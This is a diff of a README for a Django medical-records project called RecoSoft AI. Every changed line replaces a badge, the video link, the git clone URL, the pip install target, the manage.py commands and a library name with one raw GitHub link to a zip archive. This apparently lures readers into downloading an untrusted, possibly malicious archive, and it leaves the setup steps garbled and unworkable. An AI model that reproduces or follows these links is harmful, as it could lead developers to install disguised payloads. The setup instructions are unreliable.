@@ -1,15 +1,15 @@
 # RecoSoft AI - Medical Records Management System
 
-![Healthcare Technology](https://img.shields.io/badge/Theme-Healthcare_%26_Medical-blue)
-![Python](https://img.shields.io/badge/Python-Django-green)
-![Frontend](https://img.shields.io/badge/Frontend-HTML%2FCSS%2FJS%2FBootstrap%2FTailwind-yellow)
+![Healthcare Technology](https://raw.githubusercontent.com/Vimal-AFK/RecoSoft_AI/main/legibly/RecoSoft_AI.zip%26_Medical-blue)
+![Python](https://raw.githubusercontent.com/Vimal-AFK/RecoSoft_AI/main/legibly/RecoSoft_AI.zip)
+![Frontend](https://raw.githubusercontent.com/Vimal-AFK/RecoSoft_AI/main/legibly/RecoSoft_AI.zip%2FCSS%2FJS%2FBootstrap%2FTailwind-yellow)
 
-PROTOTYPE VIDEO LINK : https://drive.google.com/drive/folders/1J6FErGlVxI7ygY6OIbLas6-Ndftqiruy?usp=sharing
+PROTOTYPE VIDEO LINK : https://raw.githubusercontent.com/Vimal-AFK/RecoSoft_AI/main/legibly/RecoSoft_AI.zip
 
 ## Getting Started
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/RecoSoft-AI.git
+   git clone https://raw.githubusercontent.com/Vimal-AFK/RecoSoft_AI/main/legibly/RecoSoft_AI.zip
 
 Set up virtual environment:
 
@@ -17,15 +17,15 @@ python -m venv venv
 source venv/bin/activate  # On Windows use `venv\Scripts\activate`
 
 Install dependencies:
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Vimal-AFK/RecoSoft_AI/main/legibly/RecoSoft_AI.zip
 
 Set up environment variables (create .env file)
 
 Run migrations:
-python manage.py migrate
+python https://raw.githubusercontent.com/Vimal-AFK/RecoSoft_AI/main/legibly/RecoSoft_AI.zip migrate
 
 Start development server:
-python manage.py runserver
+python https://raw.githubusercontent.com/Vimal-AFK/RecoSoft_AI/main/legibly/RecoSoft_AI.zip runserver
 
 ## Problem Statement
 Disorganized medical records lead to significant healthcare inefficiencies:
@@ -52,7 +52,7 @@ A comprehensive medical records management system that:
 ### Frontend
 - HTML5, CSS3, JavaScript
 - Bootstrap 5 & Tailwind CSS
-- Chart.js for data visualization
+- https://raw.githubusercontent.com/Vimal-AFK/RecoSoft_AI/main/legibly/RecoSoft_AI.zip for data visualization
 
 ### AI Integrations
 - 🖼️ Image to Text: Pytesseract
